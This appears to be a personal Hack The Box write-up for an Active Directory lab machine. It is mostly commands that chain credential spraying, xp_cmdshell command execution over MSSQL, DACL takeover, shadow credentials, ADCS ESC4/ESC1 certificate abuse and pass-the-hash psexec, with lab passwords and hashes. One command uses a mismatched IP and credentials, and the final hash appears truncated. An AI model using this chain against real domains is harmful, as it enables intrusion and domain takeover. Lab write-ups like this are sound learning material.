    echo 10.10.11.51     escii.htb | sudo tee -a /etc/hosts

We are given credentials for the following account: rose / KxEPkKe6R8su

# Enumeration

`nmap -sV escii.htb`
<img src="EscapeTwo-media/751b525b12a1dc9133966caeb8a4ac1b29b285d8.png"
class="wikilink" alt="Pastedimage20250201191351.png" />
Windows box with 445 (smb) open

Looking at UDP as well
`nmap -sU escii.htb`

<img src="EscapeTwo-media/d5431dcad35cb8554ca9d5a0634bf628f5c2ff32.png"
class="wikilink" alt="Pastedimage20250201191302.png" />
Tried various credentials and enumeration from: https://0xdf.gitlab.io/cheatsheets/smb-enum no success

<figure>
<img src="EscapeTwo-media/f20ea6fa5b0ceca81ccf876a4c5d97465519ac5a.png"
class="wikilink" alt="Pastedimage20250201193155.png" />
<figcaption
aria-hidden="true">Pastedimage20250201193155.png</figcaption>
</figure>

<img src="EscapeTwo-media/5db4516ec7e29d0832aaae19492e2a9243271e9f.png"
class="wikilink" alt="Pastedimage20250201193923.png" />
\## Initial Foothold
rose has read access to the Users folder and 'Accounting Department'
`smbclient //escii.htb/'Accounting Department' -U 'rose' 'KxEPkKe6R8su'`
reveals 2 excel sheets
<img src="EscapeTwo-media/7ef41d8a73aaadb1327af69b2a8e7fc68681f953.png"
class="wikilink" alt="Pastedimage20250207081802.png" />
They seem to be corrupted opening them using pandas.read_excel() fails, so raw dogging unzipped and found some credentials in accounts.xlsx/xl/sharedStrings.xml

angela@sequel.htb, angela, 0fwz7Q4mSpurIt99
oscar@sequel.htb, oscar, 86LxLBMgEWaKUnBG
kevin@sequel.htb, kevin, Md9Wlq1E5bZnVDVo
sa@sequel.htb, sa, MSSQLP@ssw0rd!

Throwing that through netexec
`nxc smb escii.htb -u users.txt -p passwords.txt --no-bruteforce --continue-on-success`

Only 'oscar' seems to have access:
<img src="EscapeTwo-media/08d2bce9c6824af0cdaece484a8d586bbe06645c.png"
class="wikilink" alt="Pastedimage20250207111320.png" />
and the credentials gives same access as rosie

<figure>
<img src="EscapeTwo-media/adc251fc3886bc9dc01a9e08dac34b931c064df7.png"
class="wikilink" alt="Pastedimage20250207111605.png" />
<figcaption
aria-hidden="true">Pastedimage20250207111605.png</figcaption>
</figure>

The sql credentials look promising though...
`nxc mssql escii.htb -u 'sa' -p 'MSSQLP@ssw0rd!' --local-auth`

hOOYAH
<img src="EscapeTwo-media/b13750b843bda0282c195ea0ab508dee2e59ef1e.png"
class="wikilink" alt="Pastedimage20250207112327.png" />
`"SELECT * FROM INFORMATION_SCHEMA.TABLES"`
<img src="EscapeTwo-media/2b68f484beed8a5197713a9fc133b1f3be43c94c.png"
class="wikilink" alt="Pastedimage20250207114044.png" />

`nxc mssql 10.10.10.52 -u admin -p 'm$$ql_S@_P@ssW0rd!' --local-auth -q 'SELECT name FROM master.dbo.sysdatabases;'`

<figure>
<img src="EscapeTwo-media/525f32ba6438cd992d1f82acec2178b9e4a0433b.png"
class="wikilink" alt="Pastedimage20250208160322.png" />
<figcaption
aria-hidden="true">Pastedimage20250208160322.png</figcaption>
</figure>

#### Overview of mssql backend commands

xp_cmdshell need to be turned on

https://www.mssqltips.com/sqlservertip/1020/enabling-xpcmdshell-in-sql-server/

``` sql
-- this turns on advanced options and is needed to configure xp_cmdshell
EXEC sp_configure 'show advanced options', '1'
RECONFIGURE
-- this enables xp_cmdshell
EXEC sp_configure 'xp_cmdshell', '1' 
RECONFIGURE
```

https://learn.microsoft.com/en-us/sql/relational-databases/system-catalog-views/security-catalog-views-transact-sql?view=sql-server-ver15

https://www.hackingarticles.in/mssql-for-pentester-command-execution-with-xp_cmdshell/
\## Moving on..
Poking around using the xp_shell execution -x "command here"
`nxc mssql escii.htb -u 'sa' -p 'MSSQLP@ssw0rd!' --local-auth -x "dir C:\SQL2019"`
<img src="EscapeTwo-media/287cb44b4314517183fccfba859ed0518f6f1d14.png"
class="wikilink" alt="Pastedimage20250209095720.png" />

<img src="EscapeTwo-media/2a39fa39b8673e22fe4955e14eda4e1be3877b8c.png"
class="wikilink" alt="Pastedimage20250209100459.png" />
`nxc mssql escii.htb -u 'sa' -p 'MSSQLP@ssw0rd!' --local-auth -x "type C:\SQL2019\ExpressAdv_ENU\sql-Configuration.INI"`

Reveals another password - throwing that into the list of passwords ad try to brute force this via SMB
<img src="EscapeTwo-media/b73ec8ba1899fc7f0477ff39fda72609ca4e9f41.png"
class="wikilink" alt="Pastedimage20250209093634.png" />

Brute forcing:
`nxc smb escii.htb -u users_expanded.txt -p passwords.txt --continue-on-success`
<img src="EscapeTwo-media/ca5d00ee94601575cff6a552692d0014329dcef7.png"
class="wikilink" alt="Pastedimage20250209094109.png" />
ryan is sql_svc
with pw: WqSZAF6CysDQbGb3

Poking around:
<img src="EscapeTwo-media/5a800dc145ba1b7df59599bb76f63cdfe7cc0913.png"
class="wikilink" alt="Pastedimage20250209101057.png" />
No access to content of administrator, Public or sql_svc
But the User flag is on ryan's desktop

<figure>
<img src="EscapeTwo-media/fffcfd2a05ac6a820daa0df1e02a61823a24bfc1.png"
class="wikilink" alt="Pastedimage20250209095128.png" />
<figcaption
aria-hidden="true">Pastedimage20250209095128.png</figcaption>
</figure>

## Privilege escalation

With foothold established, enumerate host with bloodhound
Install:
https://www.kali.org/tools/bloodhound/

It has a python tool to harvest the data via the compromised 'ryan' user
from netexec : sequel.htb and ryans credentials

cd to the folder you want the bloodhound dump and unleash:

`bloodhound-python -d sequel.htb -u ryan -p WqSZAF6CysDQbGb3 -ns 10.10.11.51`

Drag'n'drop the files into bloodhound or use the 'upload data' button

Usage:
each node has 3 panes: Database Info Node Info and Analysis
The Analysis tab has some fancy analyses to carry out
The node info tab has In and Outbound rights way at the bottom

We have ryans credentials so go from there:
<img src="EscapeTwo-media/927e30a7769f93ef45fb36f9eaeafec15b160f88.png"
class="wikilink" alt="Pastedimage20250317162154.png" />

### Possible Exploit

Ryan has WriteOwner privilege on CA_SVC assuming it is a certificate authority
There is even a feature that shows what it does (? help)
<img src="EscapeTwo-media/3b5892ae1d2c4ab744d49d71a9e3df1957297f2e.png"
class="wikilink" alt="Pastedimage20250317162644.png" />

Including abuse guides
\## Suggesting Shadow Credential Attack
https://posts.specterops.io/shadow-credentials-abusing-key-trust-account-mapping-for-takeover-8ee1a53566ab

### prepare target host

Add ryan as owner on ca_svc:

`impacket-owneredit -action write -new-owner 'ryan' -target 'ca_svc' -dc-ip 10.10.11.51 sequel.htb/ryan:WqSZAF6CysDQbGb3`

<figure>
<img src="EscapeTwo-media/14847c3c631d482e4d50b00b46242cc4fa2aaadd.png"
class="wikilink" alt="Pastedimage20250317214520.png" />
<figcaption
aria-hidden="true">Pastedimage20250317214520.png</figcaption>
</figure>

<figure>
<img src="EscapeTwo-media/a82eb9bb28048d0d41279127d426da0b478f2775.png"
class="wikilink" alt="Pastedimage20250317214606.png" />
<figcaption
aria-hidden="true">Pastedimage20250317214606.png</figcaption>
</figure>

Modify ryans privileges on ca_svc:

\`impacket-dacledit -action 'write' -rights 'FullControl' -principal 'ryan' -target 'ca_svc' -dc-ip 10.10.11.51 sequel.htb/ryan:WqSZAF6CysDQbGb3

<img src="EscapeTwo-media/eed9f8deda05f2c349e3f997838dd9cf7533cde3.png"
class="wikilink" alt="Pastedimage20250317214655.png" />
<img src="EscapeTwo-media/883e002535a4b14b2d9f24baef25f7257a6ee734.png"
class="wikilink" alt="Pastedimage20250317214738.png" />

### Certificate exploits

Yet another tool:
Pywhisker for certificate pre-authorization
(pipx install pywhisker)

pywhisker --dc-ip 10.10.11.51 -d sequel.htb -u ryan -p WqSZAF6CysDQbGb3 --target "CA_SVC" --action "add" --filename CACert --export PEM
<img src="EscapeTwo-media/ca30c8a67808b7e17149b89fbae55e2cf73bc3ec.png"
class="wikilink" alt="Pastedimage20250317214853.png" />

Dumps the certificate in the folder from where the script is run

Yet Yet another tool is needed to read the certificate- from PKINITtools (https://github.com/dirkjanm/PKINITtools)
(in a venv! git clone and install)

`python3 PKINITtools/gettgtpkinit.py -cert-pem CACert_cert.pem -key-pem CACert_priv.pem -dc-ip 10.10.11.51 sequel.htb/ca_svc ca_svc.ccache`
<img src="EscapeTwo-media/19bb7454273ea4d74a7e4c5bfb445a58c33da8bf.png"
class="wikilink" alt="Pastedimage20250317215147.png" />

Export the cache
`export KRB5CCNAME=ca_svc.ccache`
<img src="EscapeTwo-media/00e6dcb49353cff32dc5d053c6b53db38ba47037.png"
class="wikilink" alt="Pastedimage20250317215307.png" />

Get the nt hash
`python3 PKINITtools/getnthash.py -key 2f5372d436b2d6001d21e36dd5aedc32e4a7e33e59ee47ad1aa98db4cc16d10d sequel.htb/CA_SVC -dc-ip 10.10.11.51`
<img src="EscapeTwo-media/dc17599e4f30650f619aa0a688c8e08fbff1e03d.png"
class="wikilink" alt="Pastedimage20250317215459.png" />

Check the user hash for CA_SVC using netexec
<img src="EscapeTwo-media/9eb4fc93ab7821cc3fbcd385b5438d17ad54ac5b.png"
class="wikilink" alt="Pastedimage20250317220448.png" />

gives us the nt hash:
3b181b914e7a9d5508ea1e20bc2b7fce

## Privilege Escalation

Search for vulnerabilities from CA_SVC:

`certipy-ad find -vulnerable -u ca_svc@sequel.htb -hashes 3b181b914e7a9d5508ea1e20bc2b7fce -dc-ip 10.10.11.51`
Spits out a json, txt and zipfile (for bloodhound)
Found info on much the same as netexec, but in addition hereto: also contains certificate issuers names "DunderMifflinAuthentication" needed further:
<img src="EscapeTwo-media/db510d9258cad86f7a540a1865613c7e9dd012d0.png"
class="wikilink" alt="Pastedimage20250317225209.png" />

Medum article on AD attacks
https://medium.com/@offsecdeer/adcs-exploitation-part-1-common-attacks-b7ae62519828

And explains how ESC4 can be exploited (turning it to ESC1)
\#### ESC1 (SubjectAltName Impersonation)

`SubjectAltName` (SAN) is an optional certificate extension that can be populated with a subject different than the enrollee, the CA will then issue the certificate to this account: if user Mark sends a CSR with `SubjectAltName` set to Luigi's UPN, the resulting certificate will be issued to Luigi instead of Mark.

Save old (reset something..)
`certipy-ad template -username 'ca_svc@sequel.htb' -hashes 3b181b914e7a9d5508ea1e20bc2b7fce -template DunderMifflinAuthentication -save-old -dc-ip 10.10.11.51`

<figure>
<img src="EscapeTwo-media/81246e68c8c19347aad5ad18c672b1ed878931b3.png"
class="wikilink" alt="Pastedimage20250317230253.png" />
<figcaption
aria-hidden="true">Pastedimage20250317230253.png</figcaption>
</figure>

Exploit using ESC1 from the article
`certipy-ad req -username 'ca_svc@sequel.htb' -hashes 3b181b914e7a9d5508ea1e20bc2b7fce -ca sequel-DC01-CA -target DC01.sequel.htb -template DunderMifflinAuthentication -upn administrator@sequel.htb -dc-ip 10.10.11.51`
<img src="EscapeTwo-media/8e4829cc976a5f619d2621305aaa9ca76de32cb6.png"
class="wikilink" alt="Pastedimage20250317231412.png" />

Autenticate
`certipy-ad auth -pfx administrator.pfx -domain sequel.htb -dc-ip 10.10.11.51`
<img src="EscapeTwo-media/cec0059a2679aaf5eacce561f98f12a172c9ec28.png"
class="wikilink" alt="Pastedimage20250317231542.png" />
giving the administrator hash

Exploit via ps exec
`impacket-psexec sequel.htb/administrator@10.10.11.51 -hashes aad3b435b51404eeaad3b435b51404ee:7a8d4e04986afa8ed4060f75e5a0b3f`
<img src="EscapeTwo-media/f5161f291464c9b1d439f9c036ef56bfb1c467d9.png"
class="wikilink" alt="Pastedimage20250317232008.png" />

root flag on the desktop
<img src="EscapeTwo-media/77e058e77c7cdff1f9687361ffe73506c224d015.png"
class="wikilink" alt="Pastedimage20250317232224.png" />
